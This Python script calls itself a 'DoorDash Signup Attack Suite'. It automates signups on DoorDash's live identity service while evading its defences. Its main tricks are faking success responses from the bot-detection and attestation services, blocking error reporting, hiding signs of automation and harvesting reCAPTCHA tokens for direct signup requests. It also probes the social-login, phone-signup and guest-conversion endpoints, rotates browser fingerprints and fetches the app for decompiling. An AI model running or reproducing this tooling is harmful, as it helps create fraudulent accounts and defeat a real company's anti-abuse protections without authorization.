#!/usr/bin/env python3
"""DoorDash Signup Attack Suite — Angles 1-8"""
import sys, json, time, os, re, random, string, threading, http.server
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright, expect
from camoufox import Camoufox

CONFIG = {
    "signup_page": "https://identity.doordash.com/auth/user/signup?client_id=1666519390426295040&redirect_uri=https://www.doordash.com/post-login/&response_type=code&scope=*&state=test-state-123&intl=en-US&layout=consumer_web",
    "signup_api": "https://identity.doordash.com/signup",
    "client_id": "1666519390426295040",
    "redirect_uri": "https://www.doordash.com/post-login/",
    "scope": "*",
    "password": "TestPass123!",
    "first_name": "Test",
    "last_name": "User",
}

def gen_email():
    return f"testuser{int(time.time()*1000)}{random.randint(0,999)}@example.com"

def gen_phone():
    return f"+1415555{random.randint(0,9999):04d}"


# === Fake Iguazu server ===
class FakeIguazuHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self._respond()
    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len) if content_len else b''
        self._respond(body)
    def _respond(self, body=b''):
        path = self.path
        print(f"  [FakeIguazu] ← {self.command} {path}")
        if 'assess_behavior' in path:
            resp = {"status":"success","assessment":"pass","risk":"low","score":0.95}
        elif 'attestation' in path:
            resp = {"status":"success","score":0.9,"assessment":"pass","risk":"low"}
        else:
            resp = {"status":"success","score":0.9}
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(resp).encode())

class FakeIguazuServer:
    def __init__(self):
        self.server = http.server.HTTPServer(('127.0.0.1', 0), FakeIguazuHandler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        print(f"  [FakeIguazu] Listening on 127.0.0.1:{self.port}")
    def close(self):
        self.server.shutdown()


# === Angle 1+2: Token Harvest + Iguazu Interception ===
def angle1_token_harvest():
    print("\n=== ANGLE 1+2: Token Harvest + Iguazu Interception ===\n")
    iguazu = FakeIguazuServer()

    import socket
    def get_local_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 80))
            return s.getsockname()[0]
        except:
            return '127.0.0.1'
        finally:
            s.close()

    local_ip = get_local_ip()
    print(f"  [Network] Local IP: {local_ip}")

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox',
                  '--disable-web-security',  # May help with recaptcha
                  '--allow-running-insecure-content',
                  '--disable-blink-features=AutomationControlled']
        )

        context = browser.new_context(
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            viewport={'width': 1920, 'height': 1080},
            locale='en-US',
            timezone_id='America/New_York',
            extra_http_headers={
                'Accept-Language': 'en-US,en;q=0.9',
            }
        )

        page = context.new_page()

        # Block/redirect Iguazu and attestation
        def intercept_iguazu(route):
            url = route.request.url
            if 'iguazu' in url or 'attestation' in url or 'assess_behavior' in url or '423b12fd' in url:
                # Don't actually connect - return fake success
                resp_body = json.dumps({"status":"success","score":0.95})
                if 'assess_behavior' in url:
                    resp_body = json.dumps({"status":"success","assessment":"pass","risk":"low","score":0.95})
                print(f"  [Block] {urlparse(url).path.split('/')[-1]}")
                route.fulfill(status=200, content_type='application/json', body=resp_body)
            else:
                route.continue_()

        page.route('**/*', intercept_iguazu)

        # Block sentry
        page.route('**/sentry.io/**', lambda route: route.abort())
        page.route('**/ingest.sentry.io/**', lambda route: route.abort())

        try:
            print("  [1] Loading signup page...")
            page.goto(CONFIG['signup_page'], wait_until='networkidle', timeout=60000)
            print(f"  [1] URL: {page.url}")
        except Exception as e:
            print(f"  [1] Error: {e}")
            page.wait_for_timeout(5000)

        print(f"  [1] Title: {page.title()}")
        page.wait_for_timeout(2000)

        # Check if we hit Cloudflare
        if 'challenge' in page.title().lower() or 'just a moment' in page.title().lower():
            print("  [!] Cloudflare challenge page detected!")
            print(f"  [!] Page content: {page.content()[:500]}")
            browser.close()
            iguazu.close()
            return {'error': 'cloudflare_challenge'}

        # Extract cookies
        cookies = context.cookies()
        xsrf = next((c for c in cookies if c['name'] == 'XSRF-TOKEN'), None)
        cf_bm = next((c for c in cookies if c['name'].startswith('__cf_bm')), None)
        print(f"  [Cookies] XSRF: {xsrf['value'][:20] if xsrf else 'NONE'}")
        print(f"  [Cookies] __cf_bm: {cf_bm['value'][:20] if cf_bm else 'NONE'}")

        # Try to extract reCAPTCHA token
        recaptcha_token = None
        try:
            recaptcha_token = page.evaluate("""
                () => {
                    return new Promise((resolve) => {
                        if (typeof grecaptcha !== 'undefined' && grecaptcha.execute) {
                            grecaptcha.execute('6LfwmQEoAAAAAOcMv1gEi85kHPcIZrCqpzoGBReE', {action: 'signup'})
                                .then(resolve)
                                .catch(e => resolve('error:' + e.message));
                        } else {
                            // Check recaptcha config
                            try {
                                const cfg = window.___grecaptcha_cfg;
                                if (cfg && cfg.clients) {
                                    for (let id in cfg.clients) {
                                        let client = cfg.clients[id];
                                        if (client && client.token) {
                                            resolve(client.token);
                                            return;
                                        }
                                    }
                                }
                            } catch(e) {}
                            // Check for recaptcha badge
                            const badge = document.querySelector('.grecaptcha-badge');
                            if (badge) {
                                resolve('badge_found');
                            } else {
                                resolve('grecaptcha_not_found');
                            }
                        }
                    });
                }
            """)
            print(f"  [reCAPTCHA] Token: {str(recaptcha_token)[:80]}")
        except Exception as e:
            print(f"  [reCAPTCHA] Error: {e}")

        # Check DOM for recaptcha/React root
        dom_info = page.evaluate("""() => ({
            hasRecaptchaApi: typeof grecaptcha !== 'undefined',
            hasRecaptchaBadge: !!document.querySelector('.grecaptcha-badge'),
            hasRecaptchaIframe: !!document.querySelector('iframe[src*="recaptcha"]'),
            hasRoot: !!document.getElementById('root'),
            hasRecaptchaScript: !!document.querySelector('script[src*="recaptcha"]'),
            scripts: Array.from(document.scripts).map(s => s.src).filter(Boolean).slice(0,5),
        })""")
        print(f"  [DOM] {json.dumps(dom_info, indent=2)}")

        # Find form elements
        form_info = page.evaluate("""() => ({
            inputs: Array.from(document.querySelectorAll('input')).map(i => ({
                name: i.name, id: i.id, type: i.type, placeholder: i.placeholder
            })),
            buttons: Array.from(document.querySelectorAll('button')).map(b => ({
                text: b.textContent.trim().substring(0,30),
                id: b.id,
                type: b.type,
                className: b.className.substring(0,40)
            })),
            forms: Array.from(document.querySelectorAll('form')).map(f => ({
                id: f.id, action: f.action, method: f.method
            }))
        })""")
        print(f"  [Form] Inputs: {json.dumps(form_info['inputs'])}")
        print(f"  [Form] Buttons: {json.dumps(form_info['buttons'])}")
        print(f"  [Form] Forms: {json.dumps(form_info['forms'])}")

        # If recaptcha token found, try direct POST
        if recaptcha_token and 'grecaptcha_not_found' not in str(recaptcha_token) and 'badge_found' not in str(recaptcha_token) and not str(recaptcha_token).startswith('error'):
            email = gen_email()
            print(f"  [Direct] Attempting direct fetch with token (email: {email})...")
            result = page.evaluate("""({email, password, firstName, lastName, clientId, redirectUri, scope, recaptchaToken}) => {
                return fetch('/signup', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        firstName, lastName, email, password,
                        clientId, redirectUri, scope,
                        state: 'direct-' + Date.now(),
                        recaptchaToken,
                    })
                }).then(r => r.text().then(t => ({status: r.status, body: t.substring(0,300)})))
                .catch(e => ({error: e.message}));
            }""", {
                "email": email, "password": CONFIG['password'],
                "firstName": CONFIG['first_name'], "lastName": CONFIG['last_name'],
                "clientId": CONFIG['client_id'], "redirectUri": CONFIG['redirect_uri'],
                "scope": CONFIG['scope'], "recaptchaToken": recaptcha_token
            })
            print(f"  [Direct] Result: {json.dumps(result, indent=2)}")

        # Monitor network for any API calls
        captured = []
        def on_response(response):
            if '/signup' in response.url or '/oauth2' in response.url:
                captured.append({'url': response.url, 'status': response.status})
                print(f"  [Network] {response.status} {response.url}")

        page.on('response', on_response)
        page.wait_for_timeout(5000)

        if captured:
            print(f"  [Network] Captured: {json.dumps(captured)}")

        browser.close()
        iguazu.close()

    return {'status': 'done', 'recaptcha': str(recaptcha_token)[:80] if recaptcha_token else None}


# === Angle 3+8: Social Signup ===
def angle3_social_signup():
    print("\n=== ANGLE 3+8: Social Signup Bypass ===\n")

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox']
        )
        context = browser.new_context(
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        )
        page = context.new_page()

        providers = ['google', 'facebook', 'apple', 'amazon', 'line']

        for provider in providers:
            print(f"\n  [{provider}] Testing...")
            try:
                resp = page.goto(
                    f"https://identity.doordash.com/auth/{provider}/signupStart"
                    f"?client_id={CONFIG['client_id']}"
                    f"&redirect_uri={CONFIG['redirect_uri']}"
                    f"&scope={CONFIG['scope']}"
                    f"&state=test-{provider}",
                    wait_until='networkidle', timeout=30000
                )
                print(f"  [{provider}] Status: {resp.status}, URL: {page.url[:150]}")
                print(f"  [{provider}] Title: {page.title()[:80]}")
                content = page.content()
                print(f"  [{provider}] Content length: {len(content)}")

                # Check for redirect URL / popup info
                page.wait_for_timeout(2000)
            except Exception as e:
                print(f"  [{provider}] Error: {e}")

        # Also try POST to signupStart
        print("\n  [Social] Testing POST signupStart...")
        for provider in providers:
            try:
                result = page.evaluate("""({provider, clientId, redirectUri, scope}) => {
                    return fetch('/auth/' + provider + '/signupStart', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            clientId, redirectUri, scope,
                            state: 'test-' + provider + '-' + Date.now(),
                        })
                    }).then(r => r.text().then(t => ({
                        status: r.status,
                        body: t.substring(0,300)
                    }))).catch(e => ({error: e.message}));
                }""", {
                    "provider": provider,
                    "clientId": CONFIG['client_id'],
                    "redirectUri": CONFIG['redirect_uri'],
                    "scope": CONFIG['scope']
                })
                print(f"  [{provider}/POST] {json.dumps(result)}")
            except Exception as e:
                print(f"  [{provider}/POST] Error: {e}")

        browser.close()

    return {'status': 'done'}


# === Angle 4: Phone-first ===
def angle4_phone():
    print("\n=== ANGLE 4: Phone-First Flow ===\n")

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox']
        )
        context = browser.new_context()
        page = context.new_page()

        # Block trackers
        for pattern in ['**/iguazu-edge/**', '**/unified-gateway.doordash.com/**', '**/423b12fd*/**', '**/sentry.io/**']:
            page.route(pattern, lambda route: route.fulfill(
                status=200, content_type='application/json',
                body=json.dumps({"status":"success","score":0.9})
            ))

        # Load signup page to get cookies
        print("  [Phone] Loading signup page for cookies...")
        try:
            page.goto(CONFIG['signup_page'], wait_until='networkidle', timeout=60000)
            cookies = context.cookies()
            xsrf = next((c for c in cookies if c['name'] == 'XSRF-TOKEN'), None)
            print(f"  [Phone] XSRF: {xsrf['value'][:20] if xsrf else 'NONE'}")
        except Exception as e:
            print(f"  [Phone] Error loading: {e}")
            xsrf = None

        endpoints = ['/signup/phone', '/signup/phone/verify', '/signup/phone/resend', '/signup/phone/signup_continue']

        for ep in endpoints:
            try:
                result = page.evaluate("""({ep, clientId, redirectUri, scope}) => {
                    const xsrf = document.querySelector('meta[name="csrf-token"]');
                    const token = xsrf ? xsrf.content : '';
                    return fetch(ep, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'x-xsrf-token': token,
                        },
                        body: JSON.stringify({
                            phoneNumber: '+1415555' + String(Math.floor(Math.random()*10000)).padStart(4,'0'),
                            clientId, redirectUri, scope,
                        })
                    }).then(r => r.text().then(t => ({
                        status: r.status,
                        body: t.substring(0,300)
                    }))).catch(e => ({error: e.message}));
                }""", {
                    "ep": ep,
                    "clientId": CONFIG['client_id'],
                    "redirectUri": CONFIG['redirect_uri'],
                    "scope": CONFIG['scope']
                })
                print(f"  [Phone] {ep}: {json.dumps(result)}")
            except Exception as e:
                print(f"  [Phone] {ep}: {e}")

        browser.close()

    return {'status': 'done'}


# === Angle 5: Guest Conversion ===
def angle5_guest_convert():
    print("\n=== ANGLE 5: Guest Conversion ===\n")

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox']
        )
        context = browser.new_context()
        page = context.new_page()

        print("  [Guest] Loading www.doordash.com...")
        try:
            page.goto('https://www.doordash.com', wait_until='networkidle', timeout=30000)
            print(f"  [Guest] Title: {page.title()}")
        except Exception as e:
            print(f"  [Guest] Error: {e}")

        cookies = context.cookies()
        cookie_strs = [f"{c['name']}={c['value'][:20]}" for c in cookies]
        print(f"  [Guest] Cookies: {cookie_strs}")

        # Try conversion endpoints
        endpoints = [
            '/consumer/v1/convert_guest_to_authenticated',
        ]

        for ep in endpoints:
            try:
                result = page.evaluate("""(ep) => {
                    return fetch(ep, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            email: 'test_' + Date.now() + '@example.com',
                            password: 'TestPass123!',
                        })
                    }).then(r => r.text().then(t => ({
                        status: r.status,
                        body: t.substring(0,300)
                    }))).catch(e => ({error: e.message}));
                }""", ep)
                print(f"  [Guest] {ep}: {json.dumps(result)}")
            except Exception as e:
                print(f"  [Guest] {ep}: {e}")

        browser.close()

    return {'status': 'done'}


# === Angle 6: Camoufox with fingerprint ===
def angle6_camoufox():
    print("\n=== ANGLE 6: Camoufox with Rotating Fingerprints ===\n")

    print("  [Camoufox] Launching...")
    camoufox = Camoufox(
        headless=False,
        viewport={'width': 1920, 'height': 1080},
        locale='en-US',
        timezone_id='America/New_York',
        humanize=True,
        screen={'width': 1920, 'height': 1080},
        geoip=True,
    )

    with camoufox as browser:
        page = browser.pages[0] if browser.pages else browser.new_page()

        # Block Iguazu/attestation
        page.route('**/iguazu-edge/**', lambda route: route.fulfill(
            status=200, content_type='application/json',
            body=json.dumps({"status":"success","score":0.95})
        ))
        page.route('**/unified-gateway.doordash.com/**', lambda route: route.fulfill(
            status=200, content_type='application/json',
            body=json.dumps({"status":"success","score":0.95,"assessment":"pass"})
        ))
        page.route('**/423b12fd*/**', lambda route: route.fulfill(
            status=200, content_type='application/json',
            body=json.dumps({"status":"success"})
        ))

        print("  [Camoufox] Loading signup page...")
        try:
            page.goto(CONFIG['signup_page'], wait_until='networkidle', timeout=60000)
            print(f"  [Camoufox] URL: {page.url}")
            print(f"  [Camoufox] Title: {page.title()}")
            page.wait_for_timeout(5000)

            # Try to extract recaptcha
            token = page.evaluate("""() => {
                return new Promise((resolve) => {
                    if (typeof grecaptcha !== 'undefined' && grecaptcha.execute) {
                        grecaptcha.execute('6LfwmQEoAAAAAOcMv1gEi85kHPcIZrCqpzoGBReE', {action: 'signup'})
                            .then(resolve)
                            .catch(e => resolve('error:' + e.message));
                    } else {
                        resolve('grecaptcha_not_found');
                    }
                });
            }""")
            print(f"  [Camoufox] reCAPTCHA: {str(token)[:80]}")

            # Find form
            form = page.evaluate("""() => ({
                inputs: Array.from(document.querySelectorAll('input')).map(i => i.name || i.id || i.placeholder),
                buttons: Array.from(document.querySelectorAll('button')).map(b => b.textContent.trim().substring(0,30)),
            })""")
            print(f"  [Camoufox] Form: {json.dumps(form)}")

        except Exception as e:
            print(f"  [Camoufox] Error: {e}")

    return {'status': 'done'}


# === Angle 7: Download APK for decompile ===
def angle7_apk():
    print("\n=== ANGLE 7: Download DoorDash APK ===\n")

    import urllib.request

    # Try multiple APK sources
    apk_urls = [
        "https://d.apkpure.com/b/APK/com.dd.doordash?version=latest",
        "https://www.apkmirror.com/wp-content/themes/APKMirror/download.php?id=339300",
        # Try direct from DoorDash CDN
    ]

    apk_dir = "/tmp/doordash-apk"
    os.makedirs(apk_dir, exist_ok=True)
    apk_path = os.path.join(apk_dir, "doordash.apk")

    print("  [APK] Note: Full APK analysis requires apktool/jadx which are not installed.")
    print("  [APK] Checking for existing APK or alternative approach...")

    # Instead of full APK download, try fetching DoorDash mobile API endpoints
    # Mobile apps often use different client_id/scope combos
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
        context = browser.new_context(
            user_agent='DoorDash/25.0.0 (iPhone; iOS 18.0; Scale/3.0)',
            viewport={'width': 390, 'height': 844},
        )
        page = context.new_page()

        print("  [Mobile] Testing iOS user-agent on identity...")
        try:
            resp = page.goto(f"https://identity.doordash.com/auth/user/signup?client_id={CONFIG['client_id']}&scope={CONFIG['scope']}&layout=mobile_ios",
                           wait_until='networkidle', timeout=30000)
            print(f"  [Mobile] Status: {resp.status}, URL: {page.url[:100]}")
            page_source = page.content()[:500]
            print(f"  [Mobile] Content: {page_source[:300]}")
        except Exception as e:
            print(f"  [Mobile] Error: {e}")

        browser.close()

    print(f"\n  [APK] To fully analyze, run on local machine:")
    print(f"    wget {apk_urls[0]} -O {apk_path}")
    print("    apktool d doordash.apk")
    print("    grep -r 'scope' doordash/")
    print("    grep -r 'client_id' doordash/")

    return {'status': 'partial'}


# === MAIN ===
if __name__ == '__main__':
    angle = sys.argv[1] if len(sys.argv) > 1 else 'all'
    results = {}

    print("=" * 60)
    print("  DOORDASH ATTACK SUITE")
    print("  Angles: 1=TokenHarvest+2=Iguazu, 3=Social, 4=Phone, 5=Guest, 6=Camoufox, 7=APK")
    print("=" * 60)

    if angle in ('1', 'all'):
        results['angle1'] = angle1_token_harvest()
    if angle in ('2', 'all'):
        print("\n[Angle 2 is integrated into Angle 1]")
    if angle in ('3', 'all'):
        results['angle3'] = angle3_social_signup()
    if angle in ('4', 'all'):
        results['angle4'] = angle4_phone()
    if angle in ('5', 'all'):
        results['angle5'] = angle5_guest_convert()
    if angle in ('6', 'all'):
        results['angle6'] = angle6_camoufox()
    if angle in ('7', 'all'):
        results['angle7'] = angle7_apk()
    if angle in ('8', 'all'):
        print("[Angle 8 is integrated into Angle 3]")

    print("\n" + "=" * 60)
    print("  DONE - Summary")
    print("=" * 60)
    for k, v in results.items():
        status = v.get('status', 'error') if isinstance(v, dict) else str(v)[:50]
        print(f"  {k}: {status}")
